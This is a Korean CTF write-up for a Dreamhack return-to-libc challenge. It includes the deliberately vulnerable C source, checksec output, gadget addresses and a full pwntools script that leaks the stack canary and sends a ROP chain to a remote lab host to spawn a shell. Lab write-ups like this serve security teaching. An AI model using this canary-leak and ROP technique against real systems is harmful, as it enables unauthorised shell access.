```c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

```bash
$ checksec rtl
[*] './rtl'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 분석

`rtl.c` 코드와 `checksec rtl`의 결과를 볼 때, RTP 기법을 사용해야 함을 알 수 있으며, 이 과정에서 `binsh` 배열을 사용할 수 있으리라는 것을 알 수 있다.

# 취약점

`read` 함수의 사용을 보면, `buf` 배열의 크기인 `0x30`보다 충분히 큰 `0x100`바이트의 입력을 읽고 있으므로, BOF 취약점이 있음을 알 수 있다.

# 공격

위에서 언급한 BOF 취약점을 이용하여 stack canary를 얻어낸 후 return address 이후를 변조하여 쉘을 탈취하면 된다.
이를 위해 gdb, ROPgadget 등의 도구를 활용하여 얻어낸 주요 주소값은 다음과 같다.

* `system@plt` : `0x4005d0`
* `'/bin/sh'` : `0x400874`
* 'pop rdi; ret' 가젯 : `0x400853`
* 'ret' 가젯 : 0x400285
* `buf` : `$rbp-0x40`
* stack canary : `$rbp-0x8`
* return address : `$rbp+0x8`

이때, `system@plt` 함수는 `$rsp`가 `0x10` 단위로 정렬되어 있을 때에만 작동하며, `$rbp` 역시 언제나 `0x10` 단위로 정렬되어 있으므로, 'ret' 가젯이 필요하다.
따라서 다음과 같이 페이로드를 구성하면 쉘을 탈취할 수 있다.

```python
# Name: rtl.py

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug'

HOST = 'host3.dreamhack.games'
PORT = 18221 # The given port

# conn = process('./rtl')
conn = remote(HOST, PORT)

conn.sendlineafter(b'Buf: ', b'A' * 0x38)
conn.recvuntil(b'\x0a')
canary = u64(b'\x00' + conn.recv(7))
system_plt = 0x4005d0 # system@plt 주소
binsh = 0x400874 # '/bin/sh' 주소
gadget = dict()
gadget['pop rdi; ret'] = 0x400853 # 'pop rdi; ret' 가젯 주소
gadget['ret'] = 0x400285 # 'ret' 가젯 주소

payload = b'A' * 0x38
payload += p64(canary)
payload += b'A' * 0x8
payload += p64(gadget['ret'])
payload += p64(gadget['pop rdi; ret'])
payload += p64(binsh)
payload += p64(system_plt)

conn.sendlineafter(b'Buf: ', payload)
conn.interactive()
```